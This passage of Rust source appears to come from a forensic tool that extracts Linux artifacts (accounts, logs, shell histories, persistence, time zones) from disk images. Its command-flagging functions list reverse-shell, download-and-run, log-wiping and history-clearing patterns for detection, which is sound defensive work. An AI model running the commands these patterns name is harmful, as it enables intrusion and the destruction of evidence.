//! Linux system artifacts found on an ext2/3/4 volume.
//!
//! Finds the files an incident responder reads first by their Linux paths,
//! deleted copies included, and turns them into the System summary:
//! the machine (os-release, hostname, time zone), accounts (passwd, shadow,
//! group, lastlog), logons and reboots (wtmp, btmp, auth.log or secure,
//! journald), what users typed (shell histories), sudo and account changes,
//! installed packages (dpkg, apt history, dnf/yum logs, apk, pacman),
//! persistence (cron, systemd units, rc.local, SSH authorized keys, sudoers,
//! ld.so.preload), USB storage seen by the kernel, and networks
//! (NetworkManager, DHCP leases, known_hosts, /etc/hosts).
//!
//! Classic syslog lines carry the machine's local time without a year or
//! zone: they are converted with the image's own /etc/localtime and dated
//! back from the log file's modification time. RFC 3339 lines (rsyslog's
//! newer default) and the journal are exact.

use crate::windows::{NetInterface, NetworkProfile, Source, UsbDevice, WinTime};
use crate::FileRow;
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, HashMap};
use std::io::{Read, Seek};

/// Text files larger than this are read up to it.
const MAX_TEXT: u64 = 64 << 20;
/// Journal and wtmp files larger than this are skipped.
const MAX_BINARY: u64 = 256 << 20;
const MAX_EVENTS: usize = 200_000;
const MAX_COMMANDS: usize = 200_000;
const MAX_GZ: u64 = 256 << 20;

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct LinuxArtifacts {
    pub computer: LinuxComputer,
    pub users: Vec<LinuxUser>,
    pub commands: Vec<ShellCommand>,
    pub logons: Vec<Logon>,
    pub events: Vec<LinuxEvent>,
    pub packages: Vec<Package>,
    pub persistence: Vec<Persistence>,
    pub usb: Vec<UsbDevice>,
    pub networks: Vec<NetworkProfile>,
    pub interfaces: Vec<NetInterface>,
    pub logs: Vec<LogFile>,
    pub sources: Vec<Source>,
    pub timeline: Vec<WinTime>,
    /// Anti-forensics hits: (rule id, file index).
    pub hits: Vec<(String, u32)>,
}

impl LinuxArtifacts {
    pub fn is_empty(&self) -> bool {
        self.sources.is_empty()
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct LinuxComputer {
    pub hostname: String,
    pub os: String,
    pub os_id: String,
    pub version: String,
    pub time_zone: String,
    pub machine_id: String,
    /// File system created (mkfs), from the superblock.
    pub fs_created: u64,
    pub last_mounted: String,
    pub last_mount_time: u64,
    pub last_boot: u64,
    pub last_shutdown: u64,
    pub kernels: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct LinuxUser {
    pub name: String,
    pub uid: u32,
    pub gid: u32,
    pub gecos: String,
    pub home: String,
    pub shell: String,
    /// The shell lets the account log in (not nologin or false).
    pub login_shell: bool,
    /// "set (SHA-512)", "locked", "none" or "" when shadow is missing.
    pub password: String,
    pub password_changed: u64,
    pub groups: Vec<String>,
    /// Member of sudo, wheel or admin, or uid 0.
    pub admin: bool,
    pub last_logon: u64,
    pub last_from: String,
    pub logons: u32,
    pub failed: u32,
    /// Something about the account stands out (uid 0 that is not root, ...).
    pub note: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ShellCommand {
    pub user: String,
    /// bash, zsh, fish, python, mysql, ...
    pub shell: String,
    pub command: String,
    /// When the shell recorded a time (bash with HISTTIMEFORMAT, zsh, fish).
    pub time: u64,
    pub line: u32,
    pub file: u32,
    pub deleted: bool,
    /// Anti-forensic or otherwise notable command.
    pub flag: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Logon {
    pub time: u64,
    /// Session end (wtmp logout), when known.
    pub end: u64,
    pub user: String,
    /// "logon", "failed", "reboot", "shutdown"
    pub kind: String,
    /// ssh, console, su, sudo, ...
    pub how: String,
    pub from: String,
    pub tty: String,
    /// wtmp, btmp, auth log, journal
    pub source: String,
    pub file: u32,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct LinuxEvent {
    pub time: u64,
    /// Logon, Failed logon, Sudo, Account, Service, USB, Boot, Package
    pub category: String,
    pub summary: String,
    pub program: String,
    pub host: String,
    pub user: String,
    pub ip: String,
    pub message: String,
    /// auth log, syslog, journal, apt history, ...
    pub source: String,
    pub file: u32,
    /// The year was inferred (classic syslog has none).
    pub year_guessed: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Package {
    pub name: String,
    pub version: String,
    pub arch: String,
    /// dpkg, rpm, apk, pacman
    pub manager: String,
    pub installed: u64,
    /// Who asked for it (apt history "Requested-By").
    pub by: String,
    pub description: String,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Persistence {
    /// cron, systemd, rc.local, SSH key, sudoers, ld.so.preload, shell startup
    pub kind: String,
    pub location: String,
    pub name: String,
    pub command: String,
    pub user: String,
    /// The file's modification time.
    pub written: u64,
    pub unusual: bool,
    pub reason: String,
    pub file: u32,
    pub deleted: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct LogFile {
    pub file: u32,
    pub path: String,
    pub kind: String,
    pub lines: u64,
    pub first: u64,
    pub last: u64,
    pub events: u64,
    pub deleted: bool,
    pub note: String,
}

// ------------------------------------------------------------------ helpers

fn ft(secs: i64) -> u64 {
    if secs <= 0 {
        return 0;
    }
    ((secs as i128 + 11_644_473_600) * 10_000_000).clamp(0, u64::MAX as i128) as u64
}
fn ft_us(us: i64) -> u64 {
    if us <= 0 {
        return 0;
    }
    ((us as i128 + 11_644_473_600_000_000) * 10).clamp(0, u64::MAX as i128) as u64
}
fn unix_of(f: u64) -> i64 {
    (f / 10_000_000) as i64 - 11_644_473_600
}
fn u32le(b: &[u8], o: usize) -> u64 {
    b.get(o..o + 4).map(|x| u32::from_le_bytes([x[0], x[1], x[2], x[3]]) as u64).unwrap_or(0)
}
fn i32le(b: &[u8], o: usize) -> i64 {
    u32le(b, o) as u32 as i32 as i64
}
fn u64le(b: &[u8], o: usize) -> u64 {
    b.get(o..o + 8).map(|x| u64::from_le_bytes(x.try_into().unwrap())).unwrap_or(0)
}
fn be32(b: &[u8], o: usize) -> i64 {
    b.get(o..o + 4).map(|x| i32::from_be_bytes([x[0], x[1], x[2], x[3]]) as i64).unwrap_or(0)
}
fn be64(b: &[u8], o: usize) -> i64 {
    b.get(o..o + 8).map(|x| i64::from_be_bytes(x.try_into().unwrap())).unwrap_or(0)
}
fn cstr(b: &[u8]) -> String {
    let end = b.iter().position(|&c| c == 0).unwrap_or(b.len());
    String::from_utf8_lossy(&b[..end]).trim().to_string()
}
fn text(d: &[u8]) -> String {
    String::from_utf8_lossy(d).into_owned()
}

/// Home directory owner from a path: /home/alice/... -> alice, /root/... -> root.
fn home_user(path: &str) -> String {
    let p: Vec<&str> = path.split('/').collect();
    match p.get(1).copied() {
        Some("root") => "root".into(),
        // /Users on macOS.
        Some("home") | Some("Users") => p.get(2).filter(|u| **u != "Shared").map(|s| s.to_string()).unwrap_or_default(),
        // macOS root's home, /private/var/root (seen with /private dropped).
        Some("private") if p.get(2) == Some(&"var") && p.get(3) == Some(&"root") => "root".into(),
        Some("var") if p.get(2) == Some(&"root") => "root".into(),
        _ => String::new(),
    }
}

/// Commands that destroy or hide evidence, or are typical of intrusions.
pub fn notable_command(c: &str) -> Option<&'static str> {
    let l = c.to_ascii_lowercase();
    let words: Vec<&str> = l.split(|ch: char| ch.is_whitespace() || ch == ';' || ch == '|' || ch == '&').filter(|w| !w.is_empty()).collect();
    let has = |w: &str| words.iter().any(|x| *x == w || x.rsplit('/').next() == Some(w));
    if has("shred") || has("wipe") || has("srm") || has("bleachbit") || has("sfill") || has("sswap") || has("secure-delete") {
        return Some("secure deletion");
    }
    // macOS: rm -P overwrites files before removing them; diskutil secureErase.
    if (has("rm") && words.iter().any(|w| w.starts_with('-') && !w.starts_with("--") && w.contains('p'))) || (has("diskutil") && l.contains("secureerase")) {
        return Some("secure deletion");
    }
    if l.contains("history -c") || l.contains("history -w /dev/null") || l.contains("unset histfile") || l.contains("histfile=/dev/null") || l.contains("histsize=0") || l.contains("set +o history") {
        return Some("history disabled or cleared");
    }
    if (has("rm") || has("shred") || has("truncate") || l.starts_with('>') || l.contains("> /var/log") || l.contains(">/var/log") || has("cat") && l.contains("/dev/null >"))
        && (l.contains("/var/log") || l.contains("_history") || l.contains("wtmp") || l.contains("btmp") || l.contains("lastlog") || l.contains("/journal"))
    {
        return Some("logs or history removed");
    }
    if l.contains("journalctl --vacuum") || l.contains("journalctl --rotate") && l.contains("vacuum") {
        return Some("journal vacuumed");
    }
    if has("touch") && (l.contains(" -d") || l.contains(" -t") || l.contains(" -r") || l.contains("--date") || l.contains("--reference")) {
        return Some("timestamps set by hand");
    }
    if has("timedatectl") && l.contains("set-time") || has("date") && (l.contains(" -s") || l.contains("--set")) || has("hwclock") && l.contains("--set") {
        return Some("system clock changed");
    }
    if l.contains("dd if=/dev/zero") || l.contains("dd if=/dev/urandom") {
        return Some("disk or file overwritten");
    }
    if l.contains("/dev/tcp/") || l.contains("bash -i >&") || l.contains("nc -e") || l.contains("ncat -e") || l.contains("mkfifo") && has("nc") {
        return Some("reverse shell");
    }
    if (has("curl") || has("wget")) && (l.contains("| sh") || l.contains("|sh") || l.contains("| bash") || l.contains("|bash")) {
        return Some("downloaded script run");
    }
    if l.contains("base64 -d") && (l.contains("| sh") || l.contains("| bash") || l.contains("|sh") || l.contains("|bash")) {
        return Some("encoded command run");
    }
    if l.contains("ld.so.preload") {
        return Some("ld.so.preload touched");
    }
    if has("insmod") || has("modprobe") && !l.contains(" -r") {
        return Some("kernel module loaded");
    }
    if l.contains("chattr +i") {
        return Some("file made immutable");
    }
    None
}

/// Programs that run from places attackers favour.
fn unusual_command(c: &str) -> Option<&'static str> {
    let l = c.to_ascii_lowercase();
    if l.contains("/tmp/") || l.contains("/dev/shm/") || l.contains("/var/tmp/") || l.contains("/run/user/") {
        return Some("runs from a temporary directory");
    }
    if l.split(['/', ' ']).any(|p| p.starts_with('.') && p.len() > 1 && p != ".." && !p.starts_with("./")) && (l.contains("/home/") || l.contains("/root/")) {
        return Some("runs from a hidden directory");
    }
    if (l.contains("curl ") || l.contains("wget ")) || l.contains("/dev/tcp/") || l.contains("base64 -d") || l.contains("nc -e") || l.contains("python -c") || l.contains("python3 -c") || l.contains("bash -i") || l.contains("perl -e") {
        return Some("downloads or runs inline code");
    }
    None
}

// ------------------------------------------------------------------ time zones

/// A time zone from a TZif file (/etc/localtime): transitions plus the
/// POSIX rule for times after the last one.
#[derive(Debug, Clone, Default)]
pub struct Zone {
    pub name: String,
    trans: Vec<(i64, i32)>,
    first_off: i32,
    rule: Option<Rule>,
}

#[derive(Debug, Clone)]
struct Rule {
    std: i32,
    dst: Option<(i32, RuleDate, i32, RuleDate, i32)>,
}

#[derive(Debug, Clone, Copy)]
struct RuleDate {
    month: u32,
    week: u32,
    wday: u32,
}

impl Zone {
    pub fn utc() -> Zone {
        Zone { name: "UTC".into(), ..Default::default() }
    }

    /// Parses TZif (versions 1 to 4).
    pub fn parse(d: &[u8], name: &str) -> Option<Zone> {
        if d.len() < 44 || &d[..4] != b"TZif" {
            return None;
        }
        let counts = |b: &[u8], o: usize| -> Option<[usize; 6]> {
            let mut c = [0usize; 6];
            for (i, x) in c.iter_mut().enumerate() {
                *x = be32(b, o + 20 + 4 * i).max(0) as usize;
            }
            (c.iter().all(|&x| x < 1 << 20)).then_some(c)
        };
        let c1 = counts(d, 0)?;
        let [isut, isstd, leap, timecnt, typecnt, charcnt] = c1;
        let v1_len = timecnt * 5 + typecnt * 6 + charcnt + leap * 8 + isstd + isut;
        let (base, wide, c) = if d[4] >= b'2' && d.len() >= 44 + v1_len + 44 {
            let o = 44 + v1_len;
            (o + 44, true, counts(d, o)?)
        } else {
            (44, false, c1)
        };
        let [isut, isstd, leap, timecnt, typecnt, charcnt] = c;
        let tsz = if wide { 8 } else { 4 };
        let times = base;
        let idx = times + timecnt * tsz;
        let types = idx + timecnt;
        let end = types + typecnt * 6 + charcnt + leap * (tsz + 4) + isstd + isut;
        if end > d.len() || typecnt == 0 {
            return None;
        }
        let off_of = |t: usize| -> i32 { be32(d, types + 6 * t) as i32 };
        let mut z = Zone { name: name.to_string(), first_off: off_of(0), ..Default::default() };
        for i in 0..timecnt {
            let at = if wide { be64(d, times + 8 * i) } else { be32(d, times + 4 * i) };
            let t = d[idx + i] as usize;
            if t < typecnt {
                z.trans.push((at, off_of(t)));
            }
        }
        if wide {
            let footer = &d[end..];
            if footer.first() == Some(&b'\n') {
                let s: String = footer[1..].iter().take_while(|&&c| c != b'\n').map(|&c| c as char).collect();
                z.rule = parse_rule(&s);
                if z.name.is_empty() {
                    z.name = s;
                }
            }
        }
        Some(z)
    }

    /// UTC offset in seconds at a UTC instant.
    pub fn offset_at(&self, t: i64) -> i32 {
        let i = self.trans.partition_point(|x| x.0 <= t);
        if i == self.trans.len() {
            if let Some(r) = &self.rule {
                return r.offset_at(t);
            }
        }
        if i == 0 {
            return self.first_off;
        }
        self.trans[i - 1].1
    }

    /// Local wall-clock seconds to UTC seconds (the earlier reading when a
    /// local time occurs twice).
    pub fn to_utc(&self, local: i64) -> i64 {
        let o1 = self.offset_at(local - self.offset_at(local) as i64);
        let utc = local - o1 as i64;
        let o2 = self.offset_at(utc);
        if o2 != o1 {
            local - o2 as i64
        } else {
            utc
        }
    }
}

fn parse_rule(s: &str) -> Option<Rule> {
    // e.g. CET-1CEST,M3.5.0,M10.5.0/3  or  <+03>-3  or  EST5EDT,M3.2.0,M11.1.0
    let b = s.as_bytes();
    let mut p = 0usize;
    let name = |p: &mut usize| -> Option<()> {
        if b.get(*p) == Some(&b'<') {
            *p += b[*p..].iter().position(|&c| c == b'>')? + 1;
        } else {
            let st = *p;
            while *p < b.len() && b[*p].is_ascii_alphabetic() {
                *p += 1;
            }
            if *p - st < 3 {
                return None;
            }
        }
        Some(())
    };
    let num = |p: &mut usize| -> Option<i32> {
        let mut sign = 1;
        if b.get(*p) == Some(&b'-') {
            sign = -1;
            *p += 1;
        } else if b.get(*p) == Some(&b'+') {
            *p += 1;
        }
        let mut parts = [0i32; 3];
        for (k, part) in parts.iter_mut().enumerate() {
            let st = *p;
            while *p < b.len() && b[*p].is_ascii_digit() {
                *p += 1;
            }
            if *p == st {
                if k == 0 {
                    return None;
                }
                break;
            }
            *part = std::str::from_utf8(&b[st..*p]).ok()?.parse().ok()?;
            if b.get(*p) == Some(&b':') && k < 2 {
                *p += 1;
            } else {
                break;
            }
        }
        // POSIX allows hours up to 167 (24 * 7 - 1) in rules.
        if parts[0] > 167 || parts[1] > 59 || parts[2] > 59 {
            return None;
        }
        Some(sign * (parts[0] * 3600 + parts[1] * 60 + parts[2]))
    };
    name(&mut p)?;
    let std = -num(&mut p)?;
    if p >= b.len() {
        return Some(Rule { std, dst: None });
    }
    name(&mut p)?;
    let dst_off = if b.get(p).is_some_and(|c| c.is_ascii_digit() || *c == b'-' || *c == b'+') { -num(&mut p)? } else { std + 3600 };
    let date = |p: &mut usize| -> Option<(RuleDate, i32)> {
        if b.get(*p) != Some(&b',') || b.get(*p + 1) != Some(&b'M') {
            return None;
        }
        *p += 2;
        let rest = std::str::from_utf8(&b[*p..]).ok()?;
        let spec: String = rest.chars().take_while(|c| c.is_ascii_digit() || *c == '.').collect();
        *p += spec.len();
        let v: Vec<u32> = spec.split('.').filter_map(|x| x.parse().ok()).collect();
        if v.len() != 3 || !(1..=12).contains(&v[0]) || !(1..=5).contains(&v[1]) || v[2] > 6 {
            return None;
        }
        let mut at = 7200;
        if b.get(*p) == Some(&b'/') {
            *p += 1;
            at = num(p)?;
        }
        Some((RuleDate { month: v[0], week: v[1], wday: v[2] }, at))
    };
    let (start, st) = date(&mut p)?;
    let (end, et) = date(&mut p)?;
    Some(Rule { std, dst: Some((dst_off, start, st, end, et)) })
}

impl Rule {
    fn offset_at(&self, t: i64) -> i32 {
        let Some((dst, start, st, end, et)) = self.dst else { return self.std };
        let Some(dt) = chrono::DateTime::from_timestamp(t, 0) else { return self.std };
        use chrono::Datelike;
        let y = dt.year();
        // Transition instants in UTC: start is in standard time, end in daylight time.
        let s = rule_day(y, start) + st as i64 - self.std as i64;
        let e = rule_day(y, end) + et as i64 - dst as i64;
        let in_dst = if s < e { t >= s && t < e } else { t >= s || t < e };
        if in_dst {
            dst
        } else {
            self.std
        }
    }
}

/// Midnight (as seconds since the epoch, wall clock) of the rule's day in `year`.
fn rule_day(year: i32, r: RuleDate) -> i64 {
    use chrono::{Datelike, NaiveDate};
    let Some(first) = NaiveDate::from_ymd_opt(year, r.month, 1) else { return 0 };
    let wd = first.weekday().num_days_from_sunday();
    let mut day = 1 + (7 + r.wday - wd) % 7 + 7 * (r.week - 1);
    let dim = NaiveDate::from_ymd_opt(if r.month == 12 { year + 1 } else { year }, if r.month == 12 { 1 } else { r.month + 1 }, 1).and_then(|n| n.pred_opt()).map(|d| d.day()).unwrap_or(28);
    while day > dim {
        day -= 7;
    }
    NaiveDate::from_ymd_opt(year, r.month, day).and_then(|d| d.and_hms_opt(0, 0, 0)).map(|d| d.and_utc().timestamp()).unwrap_or(0)
}

// ------------------------------------------------------------------ syslog lines

const MONTHS: [&str; 12] = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];

/// One log line split up: (local seconds or exact UTC seconds, exact?, rest).
fn syslog_time(line: &str) -> Option<(i64, u32, bool, &str)> {
    // RFC 3339: 2026-10-20T08:05:30.123456+02:00 host prog: msg
    if line.len() > 20 && line.as_bytes()[4] == b'-' && line.as_bytes()[10] == b'T' {
        let sp = line.find(' ')?;
        let t = chrono::DateTime::parse_from_rfc3339(&line[..sp]).ok()?;
        return Some((t.timestamp(), t.timestamp_subsec_nanos(), true, &line[sp + 1..]));
    }
    // Classic: Oct 20 08:05:30 host prog: msg (no year, local time)
    if line.len() < 16 {
        return None;
    }
    let m = MONTHS.iter().position(|m| line.starts_with(m))? as u32 + 1;
    let day: u32 = line.get(4..6)?.trim().parse().ok()?;
    let h: u32 = line.get(7..9)?.parse().ok()?;
    let mi: u32 = line.get(10..12)?.parse().ok()?;
    let s: u32 = line.get(13..15)?.parse().ok()?;
    if !(1..=31).contains(&day) || h > 23 || mi > 59 || s > 60 || line.as_bytes().get(15) != Some(&b' ') {
        return None;
    }
    // Packed as month-day-time for the year pass: MMDDhhmmss.
    let packed = (m as i64) * 100_000_000 + (day as i64) * 1_000_000 + (h as i64) * 10_000 + (mi as i64) * 100 + s as i64;
    Some((packed, 0, false, &line[16..]))
}

fn unpack_local(packed: i64, year: i32) -> Option<i64> {
    let m = (packed / 100_000_000) as u32;
    let d = (packed / 1_000_000 % 100) as u32;
    let h = (packed / 10_000 % 100) as u32;
    let mi = (packed / 100 % 100) as u32;
    let s = (packed % 100) as u32;
    let dt = chrono::NaiveDate::from_ymd_opt(year, m, d)?.and_hms_opt(h, mi, s.min(59))?;
    Some(dt.and_utc().timestamp())
}

struct Line<'a> {
    utc: i64,
    nanos: u32,
    guessed: bool,
    host: &'a str,
    prog: &'a str,
    pid: &'a str,
    msg: &'a str,
}

/// Every parseable line of a syslog-format file, dated. Classic lines get
/// their year by counting back from the file's modification time.
fn syslog_lines<'a>(content: &'a str, mtime: u64, zone: &Zone) -> Vec<Line<'a>> {
    let raw: Vec<(i64, u32, bool, &str)> = content.lines().filter_map(syslog_time).collect();
    let end_year = chrono::DateTime::from_timestamp(unix_of(mtime).max(0), 0).map(|d| chrono::Datelike::year(&d)).unwrap_or(2026);
    let mut wraps = 0;
    let mut prev = 0i64;
    for (t, _, exact, _) in &raw {
        if !exact {
            if *t + 1_000_000 < prev {
                wraps += 1;
            }
            prev = *t;
        }
    }
    let mut year = end_year - wraps;
    prev = 0;
    let mut out = Vec::with_capacity(raw.len());
    for (t, nanos, exact, rest) in raw {
        let utc = if exact {
            t
        } else {
            if t + 1_000_000 < prev {
                year += 1;
            }
            prev = t;
            match unpack_local(t, year) {
                Some(l) => zone.to_utc(l),
                None => continue,
            }
        };
        // host prog[pid]: message
        let (host, rest) = rest.split_once(' ').unwrap_or(("", rest));
        let (tag, msg) = match rest.split_once(": ") {
            Some((a, b)) if !a.contains(' ') || a.len() < 64 => (a, b),
            _ => ("", rest),
        };
        let (prog, pid) = match tag.split_once('[') {
            Some((p, x)) => (p, x.trim_end_matches(']')),
            None => (tag, ""),
        };
        out.push(Line { utc, nanos, guessed: !exact, host, prog, pid, msg });
    }
    out
}

fn line_ft(l: &Line) -> u64 {
    ft(l.utc) + (l.nanos / 100) as u64
}

// ------------------------------------------------------------------ message rules

/// What an auth or system message means. (category, summary, user, ip, logon kind, how)
fn classify(prog: &str, msg: &str) -> Option<(&'static str, String, String, String, &'static str, &'static str)> {
    let word_after = |m: &str, key: &str| -> String { m.split(key).nth(1).and_then(|r| r.split_whitespace().next()).unwrap_or("").trim_matches(|c| c == '\'' || c == ',' || c == '"').to_string() };
    let p = prog.rsplit('/').next().unwrap_or(prog);
    match p {
        "sshd" | "sshd-session" => {
            if msg.starts_with("Accepted ") {
                let user = word_after(msg, " for ");
                let ip = word_after(msg, " from ");
                let method = msg.split_whitespace().nth(1).unwrap_or("").to_string();
                return Some(("Logon", format!("SSH logon of {} from {} ({})", user, ip, method), user, ip, "logon", "ssh"));
            }
            if msg.starts_with("Failed ") || msg.starts_with("Invalid user ") {
                let user = if msg.starts_with("Invalid user ") { word_after(msg, "Invalid user ") } else if msg.contains("invalid user ") { word_after(msg, "invalid user ") } else { word_after(msg, " for ") };
                let ip = word_after(msg, " from ");
                return Some(("Failed logon", format!("Failed SSH logon for {} from {}", user, ip), user, ip, "failed", "ssh"));
            }
            None
        }
        "sudo" => {
            if msg.contains("COMMAND=") {
                let user = msg.split(" : ").next().unwrap_or("").trim().to_string();
                let cmd = msg.split("COMMAND=").nth(1).unwrap_or("").to_string();
                let target = msg.split("USER=").nth(1).and_then(|r| r.split(" ;").next()).unwrap_or("root").to_string();
                let failed = msg.contains("incorrect password") || msg.contains("NOT in sudoers") || msg.contains("command not allowed");
                return Some((if failed { "Failed sudo" } else { "Sudo" }, format!("{} ran as {}: {}", user, target, cmd), user, String::new(), "", ""));
            }
            None
        }
        "su" => {
            if msg.starts_with("Successful su for ") || msg.starts_with("(to ") {
                let to = match msg.strip_prefix("(to ") { Some(r) => r.split(')').next().unwrap_or("").to_string(), None => word_after(msg, "su for ") };
                let by = msg.split(" by ").nth(1).or_else(|| msg.split(") ").nth(1)).and_then(|r| r.split_whitespace().next()).unwrap_or("").to_string();
                return Some(("Logon", format!("su to {} by {}", to, by), by, String::new(), "logon", "su"));
            }
            if msg.starts_with("FAILED su for ") || msg.starts_with("FAILED SU ") {
                return Some(("Failed logon", format!("Failed su: {}", msg), word_after(msg, " by "), String::new(), "failed", "su"));
            }
            None
        }
        "useradd" | "userdel" | "usermod" | "groupadd" | "groupdel" | "gpasswd" | "passwd" | "chpasswd" | "adduser" | "deluser" | "chage" => {
            if msg.starts_with("pam_unix") && !msg.contains("password changed") {
                return None;
            }
            let user = if msg.contains("name=") { word_after(msg, "name=") } else if msg.contains("for ") { word_after(msg, "for ") } else { String::new() };
            Some(("Account", format!("{}: {}", p, msg), user, String::new(), "", ""))
        }
        "login" | "systemd-logind" => {
            if msg.starts_with("ROOT LOGIN") || msg.starts_with("LOGIN ON") {
                return Some(("Logon", msg.to_string(), word_after(msg, " BY ").to_lowercase(), String::new(), "logon", "console"));
            }
            if msg.starts_with("FAILED LOGIN") {
                return Some(("Failed logon", msg.to_string(), word_after(msg, "FOR ").trim_end_matches(',').to_string(), String::new(), "failed", "console"));
            }
            None
        }
        "kernel" => {
            if msg.contains("Linux version ") && !msg.contains("Command line") {
                return Some(("Boot", format!("System booted: {}", msg.split("Linux version ").nth(1).unwrap_or("").split(" (").next().unwrap_or("")), String::new(), String::new(), "", ""));
            }
            None
        }
        "systemd" => {
            if msg.starts_with("Shutting down.") || msg.contains("Reached target System Power Off") || msg.contains("Reached target Shutdown") {
                return Some(("Boot", "System shutting down".into(), String::new(), String::new(), "", ""));
            }
            None
        }
        _ => None,
    }
}

// ------------------------------------------------------------------ collect

#[derive(Clone, Copy, PartialEq, Debug)]
enum Kind {
    OsRelease,
    Hostname,
    Timezone,
    Localtime,
    MachineId,
    Passwd,
    Shadow,
    Group,
    Lastlog,
    Wtmp,
    Btmp,
    AuthLog,
    Syslog,
    Journal,
    History(&'static str),
    DpkgStatus,
    DpkgLog,
    AptHistory,
    DnfLog,
    YumLog,
    Apk,
    Pacman,
    Cron,
    CronDir,
    Systemd,
    RcLocal,
    AuthorizedKeys,
    KnownHosts,
    Sudoers,
    Preload,
    ShellRc,
    NmConnection,
    DhcpLease,
    Hosts,
    NetIfaces,
    Kernel,
}

fn kind_name(k: Kind) -> &'static str {
    match k {
        Kind::OsRelease => "os-release",
        Kind::Hostname => "hostname",
        Kind::Timezone | Kind::Localtime => "time zone",
        Kind::MachineId => "machine-id",
        Kind::Passwd => "passwd",
        Kind::Shadow => "shadow",
        Kind::Group => "group",
        Kind::Lastlog => "lastlog",
        Kind::Wtmp => "wtmp",
        Kind::Btmp => "btmp",
        Kind::AuthLog => "auth log",
        Kind::Syslog => "syslog",
        Kind::Journal => "journal",
        Kind::History(_) => "shell history",
        Kind::DpkgStatus => "dpkg status",
        Kind::DpkgLog => "dpkg log",
        Kind::AptHistory => "apt history",
        Kind::DnfLog => "dnf log",
        Kind::YumLog => "yum log",
        Kind::Apk => "apk database",
        Kind::Pacman => "pacman database",
        Kind::Cron | Kind::CronDir => "cron",
        Kind::Systemd => "systemd unit",
        Kind::RcLocal => "rc.local",
        Kind::AuthorizedKeys => "SSH authorized keys",
        Kind::KnownHosts => "SSH known hosts",
        Kind::Sudoers => "sudoers",
        Kind::Preload => "ld.so.preload",
        Kind::ShellRc => "shell startup",
        Kind::NmConnection => "NetworkManager",
        Kind::DhcpLease => "DHCP lease",
        Kind::Hosts => "hosts",
        Kind::NetIfaces => "network config",
        Kind::Kernel => "kernel",
    }
}

/// Strips a rotation suffix: auth.log.1, auth.log.2.gz -> auth.log
fn base_log(name: &str) -> &str {
    let n = name.strip_suffix(".gz").unwrap_or(name);
    match n.rsplit_once('.') {
        Some((b, d)) if d.chars().all(|c| c.is_ascii_digit()) && !d.is_empty() => b,
        _ => n.rsplit_once('-').filter(|(_, d)| d.len() == 8 && d.chars().all(|c| c.is_ascii_digit())).map(|x| x.0).unwrap_or(n),
    }
}

fn classify_path(path: &str) -> Option<Kind> {
    // macOS keeps /etc and /var under /private.
    let p = match path.strip_prefix("/private") {
        Some(rest) if rest.starts_with("/etc/") || rest.starts_with("/var/") => rest,
        _ => path,
    };
    let name = p.rsplit('/').next().unwrap_or("");
    let dir = p.rsplit_once('/').map(|x| x.0).unwrap_or("");
    match p {
        "/etc/os-release" | "/usr/lib/os-release" => return Some(Kind::OsRelease),
        "/etc/hostname" | "/etc/HOSTNAME" => return Some(Kind::Hostname),
        "/etc/timezone" => return Some(Kind::Timezone),
        "/etc/localtime" => return Some(Kind::Localtime),
        "/etc/machine-id" => return Some(Kind::MachineId),
        "/etc/passwd" => return Some(Kind::Passwd),
        "/etc/shadow" => return Some(Kind::Shadow),
        "/etc/group" => return Some(Kind::Group),
        "/var/log/lastlog" => return Some(Kind::Lastlog),
        "/var/lib/dpkg/status" => return Some(Kind::DpkgStatus),
        "/lib/apk/db/installed" => return Some(Kind::Apk),
        "/etc/crontab" | "/etc/anacrontab" => return Some(Kind::Cron),
        "/etc/rc.local" | "/etc/rc.d/rc.local" => return Some(Kind::RcLocal),
        "/etc/sudoers" => return Some(Kind::Sudoers),
        "/etc/ld.so.preload" => return Some(Kind::Preload),
        "/etc/hosts" => return Some(Kind::Hosts),
        "/etc/network/interfaces" => return Some(Kind::NetIfaces),
        _ => {}
    }
    if dir == "/var/log" || dir == "/var/log/apt" || dir == "/var/log/installer" {
        let b = base_log(name);
        match (dir, b) {
            ("/var/log", "wtmp") => return Some(Kind::Wtmp),
            ("/var/log", "btmp") => return Some(Kind::Btmp),
            ("/var/log", "auth.log" | "secure") => return Some(Kind::AuthLog),
            ("/var/log", "syslog" | "messages" | "kern.log") => return Some(Kind::Syslog),
            ("/var/log", "dpkg.log") => return Some(Kind::DpkgLog),
            ("/var/log", "dnf.rpm.log" | "dnf.log") => return Some(Kind::DnfLog),
            ("/var/log", "yum.log") => return Some(Kind::YumLog),
            ("/var/log/apt", "history.log") => return Some(Kind::AptHistory),
            _ => {}
        }
    }
    if p.starts_with("/var/log/journal/") && (name.ends_with(".journal") || name.ends_with(".journal~")) {
        return Some(Kind::Journal);
    }
    if p.starts_with("/var/lib/pacman/local/") && name == "desc" {
        return Some(Kind::Pacman);
    }
    if dir == "/etc/cron.d" || dir == "/var/spool/cron/crontabs" || dir == "/var/spool/cron" {
        return (!name.starts_with('.')).then_some(Kind::Cron);
    }
    if matches!(dir, "/etc/cron.hourly" | "/etc/cron.daily" | "/etc/cron.weekly" | "/etc/cron.monthly") {
        return (!name.starts_with('.') && name != "0anacron").then_some(Kind::CronDir);
    }
    if dir == "/etc/sudoers.d" && name != "README" {
        return Some(Kind::Sudoers);
    }
    if (dir == "/etc/systemd/system" || dir.starts_with("/etc/systemd/system/") || dir.ends_with("/.config/systemd/user") || dir.contains("/.config/systemd/user/")) && (name.ends_with(".service") || name.ends_with(".timer") || name.ends_with(".socket") || name.ends_with(".path")) {
        return Some(Kind::Systemd);
    }
    if dir == "/etc/NetworkManager/system-connections" {
        return Some(Kind::NmConnection);
    }
    if (dir == "/var/lib/dhcp" || dir == "/var/lib/dhclient" || dir == "/var/lib/NetworkManager") && (name.ends_with(".leases") || name.ends_with(".lease")) {
        return Some(Kind::DhcpLease);
    }
